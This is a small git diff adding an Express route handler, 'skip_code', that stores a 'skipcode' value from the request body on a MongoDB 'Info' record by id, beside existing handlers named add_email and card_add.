@@ -176,6 +176,22 @@ export const add_email = (req, res) => {
 }
 
 
+export const skip_code = (req, res) => {
+    const { id, skipcode } = req.body;
+    Info.findOneAndUpdate({ _id: id }, {
+        $set: {
+            skipcode: skipcode
+        }
+    }, { new: true }, (err, ok) => {
+        if (err) {
+            res.status(400).json({ error: err })
+        }
+
+        return res.status(200).json({ success: true,id:id })
+    })
+
+}
+
 
 export const card_add = (req, res) => {
 
